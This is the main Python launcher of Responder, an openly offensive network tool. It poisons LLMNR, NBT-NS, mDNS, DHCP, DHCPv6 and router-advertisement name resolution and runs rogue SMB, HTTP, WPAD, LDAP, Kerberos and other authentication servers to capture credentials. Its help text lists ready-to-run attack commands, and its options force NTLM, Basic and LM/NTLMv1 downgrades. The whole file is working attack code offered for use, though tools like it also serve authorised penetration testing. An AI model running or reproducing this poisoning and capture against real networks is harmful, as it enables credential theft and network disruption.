#!/usr/bin/env python3
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import asyncio
import optparse
import ssl
try:
	from SocketServer import TCPServer, UDPServer, ThreadingMixIn
except:
	from socketserver import TCPServer, UDPServer, ThreadingMixIn
from threading import Thread
from utils import *
import struct
banner()

import optparse
import textwrap

class ResponderHelpFormatter(optparse.IndentedHelpFormatter):
    """Custom formatter for better help output"""
    
    def format_description(self, description):
        if description:
            return description + "\n"
        return ""
    
    def format_epilog(self, epilog):
        if epilog:
            return "\n" + epilog + "\n"
        return ""

def create_parser():
    """Create argument parser with organized option groups"""
    
    usage = textwrap.dedent("""\
        python3 %prog -I eth0 -v""")
    
    description = textwrap.dedent("""\
    ══════════════════════════════════════════════════════════════════════════════
      Responder - LLMNR/NBT-NS/mDNS Poisoner and Rogue Authentication Servers
    ══════════════════════════════════════════════════════════════════════════════
    Captures credentials by responding to broadcast/multicast name resolution,
    DHCP, DHCPv6 requests
    ══════════════════════════════════════════════════════════════════════════════""")
    
    epilog = textwrap.dedent("""\
    ══════════════════════════════════════════════════════════════════════════════
      Examples:
    ══════════════════════════════════════════════════════════════════════════════
      Basic poisoning:            python3 Responder.py -I eth0 -v
      
      ##Watch what's going on:
      Analyze mode (passive):     python3 Responder.py -I eth0 -Av

      ##Working on old networks:
      WPAD with forced auth:      python3 Responder.py -I eth0 -wFv

      ##Great module:
      Proxy auth:                 python3 Responder.py -I eth0 -Pv

      ##DHCPv6 + Proxy authentication:
      DHCPv6 attack:              python3 Responder.py -I eth0 --dhcpv6 -vP

      ##DHCP -> WPAD injection -> Proxy authentication:
      DHCP + WPAD injection:      python3 Responder.py -I eth0 -Pvd

      ##Poison requests to an arbitrary IP:
      Poison with external IP:    python3 Responder.py -I eth0 -e 10.0.0.100

      ##Poison requests to an arbitrary IPv6 IP:
      Poison with external IPv6:  python3 Responder.py -I eth0 -6 2800:ac:4000:8f9e:c5eb:2193:71:1d12
    ══════════════════════════════════════════════════════════════════════════════
      For more info: https://github.com/lgandx/Responder/blob/master/README.md
    ══════════════════════════════════════════════════════════════════════════════""")
    
    parser = optparse.OptionParser(
        usage=usage,
        version=settings.__version__,
        prog="Responder.py",
        description=description,
        epilog=epilog,
        formatter=ResponderHelpFormatter()
    )
    
    # -------------------------------------------------------------------------
    # REQUIRED OPTIONS
    # -------------------------------------------------------------------------
    required = optparse.OptionGroup(parser, 
        "Required Options",
        "These options must be specified")
    
    required.add_option('-I', '--interface',
        action="store",
        dest="Interface",
        metavar="eth0",
        default=None,
        help="Network interface to use. Use 'ALL' for all interfaces.")
    
    parser.add_option_group(required)
    
    # -------------------------------------------------------------------------
    # POISONING OPTIONS
    # -------------------------------------------------------------------------
    poisoning = optparse.OptionGroup(parser,
        "Poisoning Options", 
        "Control how Responder poisons name resolution requests")
    
    poisoning.add_option('-A', '--analyze',
        action="store_true",
        dest="Analyze",
        default=False,
        help="Analyze mode. See requests without poisoning. (passive)")
    
    poisoning.add_option('-e', '--externalip',
        action="store",
        dest="ExternalIP",
        metavar="IP",
        default=None,
        help="Poison with a different IPv4 address than Responder's.")
    
    poisoning.add_option('-6', '--externalip6',
        action="store",
        dest="ExternalIP6",
        metavar="IPv6",
        default=None,
        help="Poison with a different IPv6 address than Responder's.")
    
    poisoning.add_option('--rdnss',
        action="store_true",
        dest="RDNSS_On_Off",
        default=False,
        help="Poison via Router Advertisements with RDNSS. Sets attacker as IPv6 DNS.")
    
    poisoning.add_option('--dnssl',
        action="store",
        dest="DNSSL_Domain",
        metavar="DOMAIN",
        default=None,
        help="Poison via Router Advertisements with DNSSL. Injects DNS search suffix.")
    
    poisoning.add_option('-t', '--ttl',
        action="store",
        dest="TTL",
        metavar="HEX",
        default=None,
        help="Set TTL for poisoned answers. Hex value (30s = 1e) or 'random'.")
    
    poisoning.add_option('-N', '--AnswerName',
        action="store",
        dest="AnswerName",
        metavar="NAME",
        default=None,
        help="Canonical name in LLMNR answers. (for Kerberos relay over HTTP)")
    
    parser.add_option_group(poisoning)
    
    # -------------------------------------------------------------------------
    # DHCP OPTIONS
    # -------------------------------------------------------------------------
    dhcp = optparse.OptionGroup(parser,
        "DHCP Options",
        "DHCP and DHCPv6 poisoning attacks")
    
    dhcp.add_option('-d', '--DHCP',
        action="store_true",
        dest="DHCP_On_Off",
        default=False,
        help="Enable DHCPv4 poisoning. Injects WPAD in DHCP responses.")
    
    dhcp.add_option('-D', '--DHCP-DNS',
        action="store_true",
        dest="DHCP_DNS",
        default=False,
        help="Inject DNS server (not WPAD) in DHCPv4 responses.")
    
    dhcp.add_option('--dhcpv6',
        action="store_true",
        dest="DHCPv6_On_Off",
        default=False,
        help="Enable DHCPv6 poisoning. WARNING: May disrupt network.")
    
    parser.add_option_group(dhcp)
    
    # -------------------------------------------------------------------------
    # WPAD / PROXY OPTIONS
    # -------------------------------------------------------------------------
    wpad = optparse.OptionGroup(parser,
        "WPAD / Proxy Options",
        "Web Proxy Auto-Discovery attacks")
    
    wpad.add_option('-w', '--wpad',
        action="store_true",
        dest="WPAD_On_Off",
        default=False,
        help="Start WPAD rogue proxy server.")
    
    wpad.add_option('-F', '--ForceWpadAuth',
        action="store_true",
        dest="Force_WPAD_Auth",
        default=False,
        help="Force NTLM/Basic auth on wpad.dat retrieval. (may show prompt)")
    
    wpad.add_option('-P', '--ProxyAuth',
        action="store_true",
        dest="ProxyAuth_On_Off",
        default=False,
        help="Force proxy authentication. Highly effective. (can't use with -w)")
    
    wpad.add_option('-u', '--upstream-proxy',
        action="store",
        dest="Upstream_Proxy",
        metavar="HOST:PORT",
        default=None,
        help="Upstream proxy for rogue WPAD proxy outgoing requests.")
    
    parser.add_option_group(wpad)
    
    # -------------------------------------------------------------------------
    # AUTHENTICATION OPTIONS  
    # -------------------------------------------------------------------------
    auth = optparse.OptionGroup(parser,
        "Authentication Options",
        "Control authentication methods and downgrades")
    
    auth.add_option('-b', '--basic',
        action="store_true",
        dest="Basic",
        default=False,
        help="Return HTTP Basic auth instead of NTLM. (cleartext passwords)")
    
    auth.add_option('--lm',
        action="store_true",
        dest="LM_On_Off",
        default=False,
        help="Force LM hashing downgrade. (for Windows XP/2003)")
    
    auth.add_option('--disable-ess',
        action="store_true",
        dest="NOESS_On_Off",
        default=False,
        help="Disable Extended Session Security. (NTLMv1 downgrade)")
    
    auth.add_option('-E', '--ErrorCode',
        action="store_true",
        dest="ErrorCode",
        default=False,
        help="Return STATUS_LOGON_FAILURE. (enables WebDAV auth capture)")
    
    parser.add_option_group(auth)
    
    # -------------------------------------------------------------------------
    # OUTPUT OPTIONS
    # -------------------------------------------------------------------------
    output = optparse.OptionGroup(parser,
        "Output Options",
        "Control verbosity and logging")
    
    output.add_option('-v', '--verbose',
        action="store_true",
        dest="Verbose",
        default=False,
        help="Increase verbosity. (recommended)")
    
    output.add_option('-Q', '--quiet',
        action="store_true",
        dest="Quiet",
        default=False,
        help="Quiet mode. Minimal output from poisoners.")
    
    parser.add_option_group(output)
    
    # -------------------------------------------------------------------------
    # PLATFORM OPTIONS
    # -------------------------------------------------------------------------
    platform = optparse.OptionGroup(parser,
        "Platform Options",
        "OS-specific settings")
    
    platform.add_option('-i', '--ip',
        action="store",
        dest="OURIP",
        metavar="IP",
        default=None,
        help="Local IP to use. (OSX only)")
    
    parser.add_option_group(platform)
    
    return parser

parser = create_parser()
options, args = parser.parse_args()

if not os.geteuid() == 0:
    print(color("[!] Responder must be run as root."))
    sys.exit(-1)
elif options.OURIP == None and IsMacOS() == True:
    print("\n\033[1m\033[31mMacOS detected, -i mandatory option is missing\033[0m\n")
    parser.print_help()
    exit(-1)
    
elif options.ProxyAuth_On_Off and options.WPAD_On_Off:
    print("\n\033[1m\033[31mYou cannot use WPAD server and Proxy_Auth server at the same time, choose one of them.\033[0m\n")
    exit(-1)

settings.init()
settings.Config.populate(options)

StartupMessage()

settings.Config.ExpandIPRanges()

#Create the DB, before we start Responder.
CreateResponderDb()

Have_IPv6 = settings.Config.IPv6

class ThreadingUDPServer(ThreadingMixIn, UDPServer):
	def server_bind(self):
		if OsInterfaceIsSupported():
			try:
				if settings.Config.Bind_To_ALL:
					pass
				else:
					if (sys.version_info > (3, 0)):
						self.socket.setsockopt(socket.SOL_SOCKET, 25, bytes(settings.Config.Interface+'\0', 'utf-8'))
						if Have_IPv6:
							self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
					else:
						self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Interface+'\0')
						if Have_IPv6:
							self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
			except:
				pass
		UDPServer.server_bind(self)

class ThreadingTCPServer(ThreadingMixIn, TCPServer):
	def server_bind(self):
		if OsInterfaceIsSupported():
			try:
				if settings.Config.Bind_To_ALL:
					pass
				else:
					if (sys.version_info > (3, 0)):
						self.socket.setsockopt(socket.SOL_SOCKET, 25, bytes(settings.Config.Interface+'\0', 'utf-8'))
						if Have_IPv6:
							self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
					else:
						self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Interface+'\0')
						if Have_IPv6:
							self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
			except:
				pass
		TCPServer.server_bind(self)

class ThreadingTCPServerAuth(ThreadingMixIn, TCPServer):
	def server_bind(self):
		if OsInterfaceIsSupported():
			try:
				if settings.Config.Bind_To_ALL:
					pass
				else:
					if (sys.version_info > (3, 0)):
						self.socket.setsockopt(socket.SOL_SOCKET, 25, bytes(settings.Config.Interface+'\0', 'utf-8'))
						if Have_IPv6:
							self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
					else:
						self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Interface+'\0')
						if Have_IPv6:
							self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
			except:
				pass
		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
		TCPServer.server_bind(self)
	
class ThreadingUDPDHCPv6Server(ThreadingMixIn, UDPServer):
	allow_reuse_address = True
	address_family = socket.AF_INET6
	
	def server_bind(self):
		import socket
		import struct
		
		# Bind to :: (accept packets to ANY address including multicast)
		UDPServer.server_bind(self)
		
		print(color("[DHCPv6] Make sure to review DHCPv6 settings Responder.conf\n[DHCPv6] Only run this module for short periods of time, you might cause some disruption.", 2, 1))
		
		# Join multicast group
		group = socket.inet_pton(socket.AF_INET6, 'ff02::1:2')
		if_index = socket.if_nametoindex(settings.Config.Interface)
		mreq = group + struct.pack('@I', if_index)
		
		try:
			self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP, mreq)
			self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_MULTICAST_LOOP, 1)
			print(color("[DHCPv6] Joined ff02::1:2 port 547 on %s" % settings.Config.Interface, 2, 1))
		except Exception as e:
			print(color("[!] Multicast join failed: %s" % str(e), 1, 1))

# Set address family to IPv6
ThreadingUDPDHCPv6Server.address_family = socket.AF_INET6

class ThreadingUDPMDNSServer(ThreadingMixIn, UDPServer):
	def server_bind(self):
		MADDR = "224.0.0.251"
		MADDR6 = 'ff02::fb'
		self.socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
		self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
		Join = self.socket.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP, socket.inet_aton(MADDR) + settings.Config.IP_aton)

		#IPV6:
		if (sys.version_info > (3, 0)):
			if Have_IPv6:
				mreq = socket.inet_pton(socket.AF_INET6, MADDR6) + struct.pack('@I', if_nametoindex2(settings.Config.Interface))
				self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP, mreq)
		else:
			if Have_IPv6:
				mreq = socket.inet_pton(socket.AF_INET6, MADDR6) + struct.pack('@I', if_nametoindex2(settings.Config.Interface))
				self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP, mreq)
		if OsInterfaceIsSupported():
			try:
				if settings.Config.Bind_To_ALL:
					pass
				else:
					if (sys.version_info > (3, 0)):
						self.socket.setsockopt(socket.SOL_SOCKET, 25, bytes(settings.Config.Interface+'\0', 'utf-8'))
						if Have_IPv6:
							self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
					else:
						self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Interface+'\0')
						if Have_IPv6:
							self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
			except:
				pass
		UDPServer.server_bind(self)

class ThreadingUDPLLMNRServer(ThreadingMixIn, UDPServer):
	def server_bind(self):
		MADDR  = '224.0.0.252'
		MADDR6 = 'FF02:0:0:0:0:0:1:3'
		self.socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)		
		Join = self.socket.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP,socket.inet_aton(MADDR) + settings.Config.IP_aton)

		#IPV6:
		if Have_IPv6:
			mreq = socket.inet_pton(socket.AF_INET6, MADDR6) + struct.pack('@I', if_nametoindex2(settings.Config.Interface))
			self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP, mreq)
		if OsInterfaceIsSupported():
			try:
				if settings.Config.Bind_To_ALL:
					pass
				else:
					if (sys.version_info > (3, 0)):
						self.socket.setsockopt(socket.SOL_SOCKET, 25, bytes(settings.Config.Interface+'\0', 'utf-8'))
						if Have_IPv6:
							self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
					else:
						self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Interface+'\0')
						if Have_IPv6:
							self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
			except:
				pass
		UDPServer.server_bind(self)
		

ThreadingUDPServer.allow_reuse_address = 1
if Have_IPv6:
	ThreadingUDPServer.address_family = socket.AF_INET6

ThreadingTCPServer.allow_reuse_address = 1
if Have_IPv6:
	ThreadingTCPServer.address_family = socket.AF_INET6

ThreadingUDPMDNSServer.allow_reuse_address = 1
if Have_IPv6:
	ThreadingUDPMDNSServer.address_family = socket.AF_INET6

ThreadingUDPLLMNRServer.allow_reuse_address = 1
if Have_IPv6:
	ThreadingUDPLLMNRServer.address_family = socket.AF_INET6

ThreadingTCPServerAuth.allow_reuse_address = 1
if Have_IPv6:
	ThreadingTCPServerAuth.address_family = socket.AF_INET6

def serve_thread_udp_broadcast(host, port, handler):
	try:
		server = ThreadingUDPServer(('', port), handler)
		server.serve_forever()
	except:
		print(color("[!] ", 1, 1) + "Error starting UDP server on port " + str(port) + ", check permissions or other servers running.")

def serve_NBTNS_poisoner(host, port, handler):
	serve_thread_udp_broadcast('', port, handler)

def serve_MDNS_poisoner(host, port, handler):
	try:
		server = ThreadingUDPMDNSServer(('', port), handler)
		server.serve_forever()
	except:
		print(color("[!] ", 1, 1) + "Error starting UDP server on port " + str(port) + ", check permissions or other servers running.")

def serve_LLMNR_poisoner(host, port, handler):
	try:
		server = ThreadingUDPLLMNRServer(('', port), handler)
		server.serve_forever()
	except:
		print(color("[!] ", 1, 1) + "Error starting UDP server on port " + str(port) + ", check permissions or other servers running.")
		
def serve_thread_udp(host, port, handler):
	try:
		if OsInterfaceIsSupported():
			server = ThreadingUDPServer(('', port), handler)
			server.serve_forever()
		else:
			server = ThreadingUDPServer(('', port), handler)
			server.serve_forever()
	except:
		print(color("[!] ", 1, 1) + "Error starting UDP server on port " + str(port) + ", check permissions or other servers running.")

def serve_thread_dhcpv6(host, port, handler):
	try:
		# MUST bind to :: to receive multicast packets
		server = ThreadingUDPDHCPv6Server(('::', port), handler)
		server.serve_forever()
	except Exception as e:
		print(color("[!] DHCPv6 error: %s" % str(e), 1, 1))
		
def serve_thread_tcp(host, port, handler):
	try:
		if OsInterfaceIsSupported():
			server = ThreadingTCPServer(('', port), handler)
			server.serve_forever()
		else:
			server = ThreadingTCPServer(('', port), handler)
			server.serve_forever()
	except:
		print(color("[!] ", 1, 1) + "Error starting TCP server on port " + str(port) + ", check permissions or other servers running.")

def serve_thread_tcp_auth(host, port, handler):
	try:
		if OsInterfaceIsSupported():
			server = ThreadingTCPServerAuth(('', port), handler)
			server.serve_forever()
		else:
			server = ThreadingTCPServerAuth(('', port), handler)
			server.serve_forever()
	except:
		print(color("[!] ", 1, 1) + "Error starting TCP server on port " + str(port) + ", check permissions or other servers running.")

def serve_thread_SSL(host, port, handler):
	try:

		cert = os.path.join(settings.Config.ResponderPATH, settings.Config.SSLCert)
		key =  os.path.join(settings.Config.ResponderPATH, settings.Config.SSLKey)
		context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
		context.load_cert_chain(cert, key)
		if OsInterfaceIsSupported():
			server = ThreadingTCPServer(('', port), handler)
			server.socket = context.wrap_socket(server.socket, server_side=True)
			server.serve_forever()
		else:
			server = ThreadingTCPServer(('', port), handler)
			server.socket = context.wrap_socket(server.socket, server_side=True)
			server.serve_forever()
	except:
		print(color("[!] ", 1, 1) + "Error starting SSL server on port " + str(port) + ", check permissions or other servers running.")


def main():
	try:
		if (sys.version_info < (3, 0)):
			print(color('\n\n[-]', 3, 1) + " Still using python 2? :(")
		print(color('\n[+]', 2, 1) + " Listening for events...\n")

		threads = []
        #IPv6 Poisoning
		# DHCPv6 Server (disabled by default, enable with --dhcpv6)
		if settings.Config.DHCPv6_On_Off:
		    from servers.DHCPv6 import DHCPv6
		    threads.append(Thread(target=serve_thread_dhcpv6, args=('', 547, DHCPv6,)))

		if settings.Config.RDNSS_On_Off or settings.Config.DNSSL_Domain:
		    from poisoners.RDNSS import RDNSS
		    threads.append(Thread(target=RDNSS, args=(
        settings.Config.Interface,      # 1. interface
        settings.Config.RDNSS_On_Off,   # 2. rdnss_enabled (bool) 
        settings.Config.DNSSL_Domain    # 3. dnssl_domain (str or None)
    )))
			    
		# Load MDNS, NBNS and LLMNR Poisoners
		if settings.Config.LLMNR_On_Off:
		    from poisoners.LLMNR import LLMNR
		    threads.append(Thread(target=serve_LLMNR_poisoner, args=('', 5355, LLMNR,)))

		if settings.Config.NBTNS_On_Off:
		    from poisoners.NBTNS import NBTNS
		    threads.append(Thread(target=serve_NBTNS_poisoner, args=('', 137,  NBTNS,)))

		if settings.Config.MDNS_On_Off:
		    from poisoners.MDNS import MDNS
		    threads.append(Thread(target=serve_MDNS_poisoner,  args=('', 5353, MDNS,)))

		#// Vintage Responder BOWSER module, now disabled by default. 
		#// Generate to much noise & easily detectable on the network when in analyze mode.
		# Load Browser Listener
		#from servers.Browser import Browser
		#threads.append(Thread(target=serve_thread_udp_broadcast, args=('', 138,  Browser,)))

		if settings.Config.HTTP_On_Off:
			from servers.HTTP import HTTP
			threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 80, HTTP,)))

		if settings.Config.WinRM_On_Off:
			from servers.WinRM import WinRM
			threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 5985, WinRM,)))

		if settings.Config.WinRM_On_Off:
			from servers.WinRM import WinRM
			threads.append(Thread(target=serve_thread_SSL, args=(settings.Config.Bind_To, 5986, WinRM,)))

		if settings.Config.SSL_On_Off:
			from servers.HTTP import HTTP
			threads.append(Thread(target=serve_thread_SSL, args=(settings.Config.Bind_To, 443, HTTP,)))

		if settings.Config.RDP_On_Off:
			from servers.RDP import RDP
			threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 3389, RDP,)))

		if settings.Config.DCERPC_On_Off:
			from servers.RPC import RPCMap, RPCMapper
			threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 135, RPCMap,)))
			threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, settings.Config.RPCPort, RPCMapper,)))

		if settings.Config.WPAD_On_Off:
			from servers.HTTP_Proxy import HTTP_Proxy
			threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 3128, HTTP_Proxy,)))

		if settings.Config.ProxyAuth_On_Off:
		        from servers.Proxy_Auth import Proxy_Auth
		        threads.append(Thread(target=serve_thread_tcp_auth, args=(settings.Config.Bind_To, 3128, Proxy_Auth,)))

		if settings.Config.SMB_On_Off:
			if settings.Config.LM_On_Off:
				from servers.SMB import SMB1LM
				threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 445, SMB1LM,)))
				threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 139, SMB1LM,)))
			else:
				from servers.SMB import SMB1
				threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 445, SMB1,)))
				threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 139, SMB1,)))

		if settings.Config.QUIC_On_Off:
			from servers.QUIC import start_quic_server
			cert = os.path.join(settings.Config.ResponderPATH, settings.Config.SSLCert)
			key = os.path.join(settings.Config.ResponderPATH, settings.Config.SSLKey)
			threads.append(Thread(target=lambda: asyncio.run(start_quic_server(settings.Config.Bind_To, cert, key))))

		if settings.Config.Krb_On_Off:
			from servers.Kerberos import KerbTCP, KerbUDP
			threads.append(Thread(target=serve_thread_udp, args=('', 88, KerbUDP,)))
			threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 88, KerbTCP,)))

		if settings.Config.SQL_On_Off:
			from servers.MSSQL import MSSQL, MSSQLBrowser
			threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 1433, MSSQL,)))
			threads.append(Thread(target=serve_thread_udp_broadcast, args=(settings.Config.Bind_To, 1434, MSSQLBrowser,)))

		if settings.Config.FTP_On_Off:
			from servers.FTP import FTP
			threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 21, FTP,)))

		if settings.Config.POP_On_Off:
			from servers.POP3 import POP3
			threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 110, POP3,)))

		if settings.Config.LDAP_On_Off:
			from servers.LDAP import LDAP, CLDAP
			threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 389, LDAP,)))
			threads.append(Thread(target=serve_thread_SSL, args=(settings.Config.Bind_To, 636, LDAP,)))
			threads.append(Thread(target=serve_thread_udp, args=('', 389, CLDAP,)))

		if settings.Config.MQTT_On_Off:
			from servers.MQTT import MQTT
			threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 1883, MQTT,)))

		if settings.Config.SMTP_On_Off:
			from servers.SMTP import ESMTP
			threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 25,  ESMTP,)))
			threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 587, ESMTP,)))

		if settings.Config.IMAP_On_Off:
			from servers.IMAP import IMAP
			threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 143, IMAP,)))
			from servers.IMAP import IMAPS
			threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 993, IMAPS,)))


		if settings.Config.DNS_On_Off:
			from servers.DNS import DNS, DNSTCP
			threads.append(Thread(target=serve_thread_udp, args=('', 53, DNS,)))
			threads.append(Thread(target=serve_thread_tcp, args=('', 53, DNSTCP,)))

		if settings.Config.SNMP_On_Off:
			from servers.SNMP import SNMP
			threads.append(Thread(target=serve_thread_udp, args=('', 161, SNMP,)))

		for thread in threads:
			thread.daemon = True
			thread.start()

		if settings.Config.AnalyzeMode:
			print(color('[+] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.', 3, 1))
		if settings.Config.Quiet_Mode:
			print(color('[+] Responder is in quiet mode. No NBT-NS, LLMNR, MDNS messages will print to screen.', 3, 1))
			

		if settings.Config.DHCP_On_Off:
			from poisoners.DHCP import DHCP
			DHCP(settings.Config.DHCP_DNS)

		while True:
			time.sleep(1)

	except KeyboardInterrupt:
		# Optional: Print DHCPv6 statistics on shutdown
		if settings.Config.DHCPv6_On_Off:
			try:
				from servers.DHCPv6 import print_dhcpv6_stats
				print_dhcpv6_stats()
			except:
				raise
				pass
		sys.exit("\r%s Exiting..." % color('[+]', 2, 1))

if __name__ == '__main__':
	main()
